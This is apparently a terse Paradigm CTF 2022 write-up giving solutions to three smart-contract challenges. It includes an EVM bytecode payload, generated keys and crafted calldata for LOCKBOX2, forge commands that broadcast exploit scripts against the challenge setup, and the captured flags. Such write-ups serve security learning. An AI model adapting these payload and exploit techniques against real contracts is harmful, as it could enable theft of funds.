# Paradigm CTF 2022 Writeup

**Table of Contents**
- [RANDOM](#random)
- [SOURCECODE](#sourcecode)

## LOCKBOX2

Stage 5 payload:
```
PUSH1
2
GAS
MOD
PUSH1
[LABEL] // 8
JUMPI
STOP
JUMPDEST
```

Generate keys and a calldata:
```
python gen_calldata.py
```

```
private_key = 33066969900863013438679484345314422830357761466446460687128501697697808975449
public_key_hex = '000f3970c75c7bd01fe93a61b0e00841b983e5755c847a3d97bda0ca8ec8aef53ddbd8cedd0912627192e238d2479938481c78c0e88b532b6e6d64a77d3e40fe'

calldata = '890d690800000000000000000000000000000000000000000000000000000000000000610000000000000000000000000000000000000000000000000000000000000101000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010060025A06600857005b5b5b3060408060153d393df3000f3970c75c7bd01fe93a61b0e00841b983e5755c847a3d97bda0ca8ec8aef53ddbd8cedd0912627192e238d2479938481c78c0e88b532b6e6d64a77d3e40fe0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'

890d6908
0000000000000000000000000000000000000000000000000000000000000061 [0x0, 0x20)
0000000000000000000000000000000000000000000000000000000000000101 [0x20, 0x40)
0000000000000000000000000000000000000000000000000000000000000001 [0x40, 0x60)
0000000000000000000000000000000000000000000000000000000000000001 [0x60, 0x80)
0060025A06600857005b5b5b3060408060153d393df3000f3970c75c7bd01fe9 [0x80, 0xa0)
3a61b0e00841b983e5755c847a3d97bda0ca8ec8aef53ddbd8cedd0912627192 [0xa0, 0xc0)
e238d2479938481c78c0e88b532b6e6d64a77d3e40fe00000000000000000000 [0xc0, 0xe0)
0000000000000000000000000000000000000000000000000000000000000000 [0xe0, 0x100)
0000000000000000000000000000000000000000000000000000000000000000 [0x100, 0x120)
0000000000000000000000000000000000000000000000000000000000000000 [0x120, 0x140)
```

Exploit:
```
forge script Lockbox2ExploitScript --fork-url $RPC_PARADIGM --private-keys $PRIVATE_KEY1 --private-keys $PRIVATE_KEY2 --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

## RANDOM

Test:
```
forge test -vvvvv --match-contract RandomExploitTest
```

Exploit:
```
forge script RandomExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

Flag: `PCTF{IT5_C7F_71M3}`

## SOURCECODE

Compile the quine:
```
huffc -r Quine.huff
```

Test:
```
forge test -vvvvv --match-contract SourceCodeExploitTest
```

Exploit:
```
forge script SourceCodeExploitScript --fork-url $RPC_PARADIGM --private-key $PRIVATE_KEY --gas-limit 10000000 --sig "run(address)" $SETUP_ADDRESS -vvvvv --broadcast
```

Flag: `PCTF{QUiNE_QuiNe_qU1n3}`